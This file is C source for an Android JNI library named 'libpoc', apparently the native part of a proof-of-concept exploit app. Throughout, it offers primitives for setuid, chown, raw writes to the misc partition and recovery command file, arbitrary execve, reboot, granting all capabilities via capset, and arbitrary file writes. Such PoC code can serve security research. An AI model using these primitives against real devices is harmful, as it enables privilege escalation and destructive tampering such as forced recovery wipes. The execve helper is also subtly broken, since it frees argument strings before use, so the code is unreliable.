#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/reboot.h>
#include <sys/capability.h>
#include <android/log.h>

#define LOG_TAG "libpoc"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1setuid(JNIEnv *env, jclass clazz, jint uid) {
    int ret = setuid(uid);
    return ret == 0 ? 0 : -errno;
}

JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1chown(JNIEnv *env, jclass clazz, jstring path, jint uid, jint gid) {
    const char *cpath = (*env)->GetStringUTFChars(env, path, NULL);
    int ret = chown(cpath, uid, gid);
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    return ret == 0 ? 0 : -errno;
}

JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1write_1misc(JNIEnv *env, jclass clazz, jstring cmd) {
    const char *ccmd = (*env)->GetStringUTFChars(env, cmd, NULL);
    int fd = open("/dev/block/by-name/misc", O_RDWR);
    if (fd < 0) {
        fd = open("/dev/block/misc", O_RDWR);
    }
    if (fd < 0) {
        (*env)->ReleaseStringUTFChars(env, cmd, ccmd);
        return -errno;
    }
    off_t off = lseek(fd, 0, SEEK_SET);
    if (off < 0) {
        close(fd);
        (*env)->ReleaseStringUTFChars(env, cmd, ccmd);
        return -errno;
    }
    ssize_t written = write(fd, ccmd, strlen(ccmd));
    close(fd);
    (*env)->ReleaseStringUTFChars(env, cmd, ccmd);
    return (written > 0) ? 0 : -errno;
}

JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1write_1recovery_1command(JNIEnv *env, jclass clazz, jstring cmd) {
    const char *ccmd = (*env)->GetStringUTFChars(env, cmd, NULL);
    int fd = open("/cache/recovery/command", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        (*env)->ReleaseStringUTFChars(env, cmd, ccmd);
        return -errno;
    }
    ssize_t written = write(fd, ccmd, strlen(ccmd));
    close(fd);
    (*env)->ReleaseStringUTFChars(env, cmd, ccmd);
    return (written > 0) ? 0 : -errno;
}

JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1execve(JNIEnv *env, jclass clazz, jstring cmd, jobjectArray args) {
    const char *ccmd = (*env)->GetStringUTFChars(env, cmd, NULL);
    int argc = (*env)->GetArrayLength(env, args);
    char **argv = malloc((argc + 2) * sizeof(char *));
    if (!argv) {
        (*env)->ReleaseStringUTFChars(env, cmd, ccmd);
        return -ENOMEM;
    }
    argv[0] = (char *)ccmd;
    for (int i = 0; i < argc; i++) {
        jstring str = (jstring)(*env)->GetObjectArrayElement(env, args, i);
        const char *cstr = (*env)->GetStringUTFChars(env, str, NULL);
        argv[i+1] = (char *)cstr;
        (*env)->ReleaseStringUTFChars(env, str, cstr);
    }
    argv[argc+1] = NULL;
    int ret = execve(ccmd, argv, NULL);
    free(argv);
    (*env)->ReleaseStringUTFChars(env, cmd, ccmd);
    return ret == 0 ? 0 : -errno;
}

JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1reboot_1syscall(JNIEnv *env, jclass clazz, jint magic, jint magic2, jint cmd) {
    // reboot() 関数は libc のラッパー。cmd には LINUX_REBOOT_CMD_* を指定
    int ret = reboot(cmd);
    return ret == 0 ? 0 : -errno;
}

JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1capset(JNIEnv *env, jclass clazz) {
    // capset システムコールを直接呼ぶ (__NR_capset は bionic で定義されている)
    struct __user_cap_header_struct header = { _LINUX_CAPABILITY_VERSION_3, 0 };
    struct __user_cap_data_struct data[2];
    // まず現在のケイパビリティを取得
    int ret = capget(&header, data);
    if (ret < 0) return -errno;
    // 全ケイパビリティを許可・実効に設定
    data[0].permitted = data[0].effective = 0xffffffff;
    data[1].permitted = data[1].effective = 0xffffffff;
    ret = capset(&header, data);
    return ret == 0 ? 0 : -errno;
}

JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1open_1write(JNIEnv *env, jclass clazz, jstring path, jstring data) {
    const char *cpath = (*env)->GetStringUTFChars(env, path, NULL);
    const char *cdata = (*env)->GetStringUTFChars(env, data, NULL);
    int fd = open(cpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        (*env)->ReleaseStringUTFChars(env, path, cpath);
        (*env)->ReleaseStringUTFChars(env, data, cdata);
        return -errno;
    }
    ssize_t written = write(fd, cdata, strlen(cdata));
    close(fd);
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    (*env)->ReleaseStringUTFChars(env, data, cdata);
    return (written > 0) ? 0 : -errno;
}
